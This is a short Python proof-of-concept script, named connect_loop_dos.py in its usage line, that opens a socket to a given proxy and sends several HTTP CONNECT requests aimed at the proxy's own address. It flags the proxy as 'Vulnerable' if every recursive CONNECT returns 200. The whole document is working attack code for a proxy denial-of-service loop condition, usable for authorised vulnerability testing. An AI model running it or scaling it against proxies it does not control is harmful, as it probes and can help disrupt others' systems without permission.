import socket
import sys


def send_connect_loop(proxy_ip: str, proxy_port: int = 8080, attempts: int = 4):
    try:
        print(f"[*] Connecting to proxy at {proxy_ip}:{proxy_port}...")
        sock = socket.create_connection((proxy_ip, proxy_port), timeout=5)

        connect_request = f"CONNECT {proxy_ip}:{proxy_port} HTTP/1.0\r\n\r\n"
        success = 0

        for i in range(attempts):
            print(f"[*] Sending CONNECT attempt {i+1}...")
            sock.sendall(connect_request.encode())
            response = b""

            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    break

            if b"200" in response:
                print(f"[+] Attempt {i+1}: Received HTTP 200 OK")
                success += 1
            else:
                print(f"[-] Attempt {i+1}: Unexpected or failed response")
                break

        if success == attempts:
            print("[!] Vulnerable: Proxy allows recursive CONNECT requests")
        else:
            print("[+] Not Vulnerable: Proxy denied or limited CONNECT attempts")

        sock.close()

    except Exception as e:
        print(f"[!] Connection error: {e}")


def parse_target(target: str):
    if ':' in target:
        ip, port = target.split(':')
        return ip, int(port)
    return target, 8080


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 connect_loop_dos.py <proxy_ip[:port]>")
        sys.exit(1)

    proxy_ip, proxy_port = parse_target(sys.argv[1])
    send_connect_loop(proxy_ip, proxy_port)
